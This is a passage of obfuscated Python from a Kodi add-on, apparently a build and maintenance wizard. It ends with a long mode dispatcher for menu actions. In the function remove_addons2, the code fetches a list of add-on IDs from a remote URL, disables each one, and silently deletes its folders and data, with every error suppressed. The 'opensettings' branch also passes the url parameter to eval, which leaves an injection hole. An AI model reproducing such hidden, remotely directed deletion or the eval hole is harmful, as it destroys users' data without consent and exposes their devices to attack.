				OOOO0000OO0O0O00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOO000O0OOOOOOOO ,'false')#line:5025
				O0O00000O0O0OOO00 =xbmc .executeJSONRPC (OOOO0000OO0O0O00O )#line:5026
				O0OOO00O0O00OOO00 =json .loads (O0O00000O0O0OOO00 )#line:5027
				OO0O00O00O000O0OO =os .path .join (addons_folder ,OOOO000O0OOOOOOOO )#line:5029
				if os .path .exists (OO0O00O00O000O0OO ):#line:5031
					for OOO00OOOOO000OO0O ,OOOO0OO0O0000OO0O ,O00O0000O000OOO0O in os .walk (OO0O00O00O000O0OO ):#line:5032
						for OOO00O000O0OO0OO0 in O00O0000O000OOO0O :#line:5033
							os .unlink (os .path .join (OOO00OOOOO000OO0O ,OOO00O000O0OO0OO0 ))#line:5034
						for O0OOOO00O000O000O in OOOO0OO0O0000OO0O :#line:5035
							shutil .rmtree (os .path .join (OOO00OOOOO000OO0O ,O0OOOO00O000O000O ))#line:5036
					os .rmdir (OO0O00O00O000O0OO )#line:5037
			xbmc .executebuiltin ('Container.Refresh')#line:5039
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5040
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5041
	except :pass #line:5042
def remove_addons2 ():#line:5043
	try :#line:5044
			import json #line:5045
			OO0OOO00OOOO0000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5046
			for O0OO000OO0OO0O0O0 in OO0OOO00OOOO0000O :#line:5047
				OOOO000OO00O0OO0O =O0OO000OO0OO0O0O0 .split (':')[1 ].strip ()#line:5049
				O0OOO00OOO0O0OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOO000OO00O0OO0O ,'false')#line:5050
				OOOO0OOOO0OOO0O0O =xbmc .executeJSONRPC (O0OOO00OOO0O0OO00 )#line:5051
				O00OOOOOOO0O00O00 =json .loads (OOOO0OOOO0OOO0O0O )#line:5052
				O0O0OOOO0000O0000 =os .path .join (user_folder ,OOOO000OO00O0OO0O )#line:5054
				if os .path .exists (O0O0OOOO0000O0000 ):#line:5056
					for O0O0OOO0O00OO0O00 ,O0000OO00OO000OOO ,O000OO0O0OOO00OO0 in os .walk (O0O0OOOO0000O0000 ):#line:5057
						for OOOO0000O00O000OO in O000OO0O0OOO00OO0 :#line:5058
							os .unlink (os .path .join (O0O0OOO0O00OO0O00 ,OOOO0000O00O000OO ))#line:5059
						for O000O0O0OO00OO000 in O0000OO00OO000OOO :#line:5060
							shutil .rmtree (os .path .join (O0O0OOO0O00OO0O00 ,O000O0O0OO00OO000 ))#line:5061
					os .rmdir (O0O0OOOO0000O0000 )#line:5062
	except :pass #line:5064
params =get_params ()#line:5065
url =None #line:5066
name =None #line:5067
mode =None #line:5068
try :mode =urllib .unquote_plus (params ["mode"])#line:5070
except :pass #line:5071
try :name =urllib .unquote_plus (params ["name"])#line:5072
except :pass #line:5073
try :url =urllib .unquote_plus (params ["url"])#line:5074
except :pass #line:5075
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5077
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5078
def setView (OO0OO00OOO0OOO00O ,O0OO0OOO0OOOO0O0O ):#line:5079
	if wiz .getS ('auto-view')=='true':#line:5080
		OOOO0OOO0OOOOO000 =wiz .getS (O0OO0OOO0OOOO0O0O )#line:5081
		if OOOO0OOO0OOOOO000 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO0OOOOO000 ='55'#line:5082
		if OOOO0OOO0OOOOO000 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO0OOOOO000 ='50'#line:5083
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO0OOO0OOOOO000 )#line:5084
if mode ==None :index ()#line:5086
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5088
elif mode =='builds':buildMenu ()#line:5089
elif mode =='viewbuild':viewBuild (name )#line:5090
elif mode =='buildinfo':buildInfo (name )#line:5091
elif mode =='buildpreview':buildVideo (name )#line:5092
elif mode =='install':buildWizard (name ,url )#line:5093
elif mode =='theme':buildWizard (name ,mode ,url )#line:5094
elif mode =='viewthirdparty':viewThirdList (name )#line:5095
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5096
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5097
elif mode =='maint':maintMenu (name )#line:5099
elif mode =='passpin':passandpin ()#line:5100
elif mode =='backmyupbuild':backmyupbuild ()#line:5101
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5102
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5103
elif mode =='advancedsetting':advancedWindow (name )#line:5104
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5105
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5106
elif mode =='asciicheck':wiz .asciiCheck ()#line:5107
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5108
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5109
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5110
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5111
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5112
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5113
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5114
elif mode =='currentsettings':viewAdvanced ()#line:5115
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5116
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5117
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5118
elif mode =='fixskin':backtokodi ()#line:5119
elif mode =='testcommand':testcommand ()#line:5120
elif mode =='rdon':rdon ()#line:5121
elif mode =='rdoff':rdoff ()#line:5122
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5123
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5124
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5125
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5126
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5127
elif mode =='freshstart':freshStart ()#line:5128
elif mode =='forceupdate':wiz .forceUpdate ()#line:5129
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5130
elif mode =='forceclose':wiz .killxbmc ()#line:5131
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5132
elif mode =='hidepassword':wiz .hidePassword ()#line:5133
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5134
elif mode =='enableaddons':enableAddons ()#line:5135
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5136
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5137
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5138
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5139
elif mode =='uploadlog':uploadLog .Main ()#line:5140
elif mode =='viewlog':LogViewer ()#line:5141
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5142
elif mode =='viewerrorlog':errorChecking (all =True )#line:5143
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5144
elif mode =='purgedb':purgeDb ()#line:5145
elif mode =='fixaddonupdate':fixUpdate ()#line:5146
elif mode =='removeaddons':removeAddonMenu ()#line:5147
elif mode =='removeaddon':removeAddon (name )#line:5148
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5149
elif mode =='removedata':removeAddonData (name )#line:5150
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5151
elif mode =='systeminfo':systemInfo ()#line:5152
elif mode =='restorezip':restoreit ('build')#line:5153
elif mode =='restoregui':restoreit ('gui')#line:5154
elif mode =='restoreaddon':restoreit ('addondata')#line:5155
elif mode =='restoreextzip':restoreextit ('build')#line:5156
elif mode =='restoreextgui':restoreextit ('gui')#line:5157
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5158
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5159
elif mode =='apk':apkMenu (name )#line:5161
elif mode =='apkscrape':apkScraper (name )#line:5162
elif mode =='apkinstall':apkInstaller (name ,url )#line:5163
elif mode =='speed':speedMenu ()#line:5164
elif mode =='net':net_tools ()#line:5165
elif mode =='GetList':GetList (url )#line:5166
elif mode =='youtube':youtubeMenu (name )#line:5167
elif mode =='viewVideo':playVideo (url )#line:5168
elif mode =='addons':addonMenu (name )#line:5170
elif mode =='addoninstall':addonInstaller (name ,url )#line:5171
elif mode =='savedata':saveMenu ()#line:5173
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5174
elif mode =='managedata':manageSaveData (name )#line:5175
elif mode =='whitelist':wiz .whiteList (name )#line:5176
elif mode =='trakt':traktMenu ()#line:5178
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5179
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5180
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5181
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5182
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5183
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5184
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5185
elif mode =='realdebrid':realMenu ()#line:5187
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5188
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5189
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5190
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5191
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5192
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5193
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5194
elif mode =='login':loginMenu ()#line:5196
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5197
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5198
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5199
elif mode =='clearlogin':loginit .clearSaved (name )#line:5200
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5201
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5202
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5203
elif mode =='contact':notify .contact (CONTACT )#line:5205
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5206
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5207
elif mode =='developer':developer ()#line:5209
elif mode =='converttext':wiz .convertText ()#line:5210
elif mode =='createqr':wiz .createQR ()#line:5211
elif mode =='testnotify':testnotify ()#line:5212
elif mode =='testnotify2':testnotify2 ()#line:5213
elif mode =='servicemanual':servicemanual ()#line:5214
elif mode =='fastinstall':fastinstall ()#line:5215
elif mode =='testupdate':testupdate ()#line:5216
elif mode =='testfirst':testfirst ()#line:5217
elif mode =='testfirstrun':testfirstRun ()#line:5218
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5219
elif mode =='bg':wiz .bg_install (name ,url )#line:5221
elif mode =='bgcustom':wiz .bg_custom ()#line:5222
elif mode =='bgremove':wiz .bg_remove ()#line:5223
elif mode =='bgdefault':wiz .bg_default ()#line:5224
elif mode =='rdset':rdsetup ()#line:5225
elif mode =='mor':morsetup ()#line:5226
elif mode =='mor2':morsetup2 ()#line:5227
elif mode =='resolveurl':resolveurlsetup ()#line:5228
elif mode =='urlresolver':urlresolversetup ()#line:5229
elif mode =='forcefastupdate':forcefastupdate ()#line:5230
elif mode =='traktset':traktsetup ()#line:5231
elif mode =='placentaset':placentasetup ()#line:5232
elif mode =='flixnetset':flixnetsetup ()#line:5233
elif mode =='reptiliaset':reptiliasetup ()#line:5234
elif mode =='yodasset':yodasetup ()#line:5235
elif mode =='numbersset':numberssetup ()#line:5236
elif mode =='uranusset':uranussetup ()#line:5237
elif mode =='genesisset':genesissetup ()#line:5238
elif mode =='fastupdate':fastupdate ()#line:5239
elif mode =='folderback':folderback ()#line:5240
elif mode =='menudata':Menu ()#line:5241
elif mode ==2 :#line:5243
        wiz .torent_menu ()#line:5244
elif mode ==3 :#line:5245
        wiz .popcorn_menu ()#line:5246
elif mode ==8 :#line:5247
        wiz .metaliq_fix ()#line:5248
elif mode ==9 :#line:5249
        wiz .quasar_menu ()#line:5250
elif mode ==5 :#line:5251
        swapSkins ('skin.Premium.mod')#line:5252
elif mode ==13 :#line:5253
        wiz .elementum_menu ()#line:5254
elif mode ==16 :#line:5255
        wiz .fix_wizard ()#line:5256
elif mode ==17 :#line:5257
        wiz .last_play ()#line:5258
elif mode ==18 :#line:5259
        wiz .normal_metalliq ()#line:5260
elif mode ==19 :#line:5261
        wiz .fast_metalliq ()#line:5262
elif mode ==20 :#line:5263
        wiz .fix_buffer2 ()#line:5264
elif mode ==21 :#line:5265
        wiz .fix_buffer3 ()#line:5266
elif mode ==11 :#line:5267
        wiz .fix_buffer ()#line:5268
elif mode ==15 :#line:5269
        wiz .fix_font ()#line:5270
elif mode ==14 :#line:5271
        wiz .clean_pass ()#line:5272
elif mode ==22 :#line:5273
        wiz .movie_update ()#line:5274
elif mode =='adv_settings':buffer1 ()#line:5275
elif mode =='getpass':getpass ()#line:5276
elif mode =='setpass':setpass ()#line:5277
elif mode =='setuname':setuname ()#line:5278
elif mode =='passandUsername':passandUsername ()#line:5279
elif mode =='9':disply_hwr ()#line:5280
elif mode =='99':disply_hwr2 ()#line:5281
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))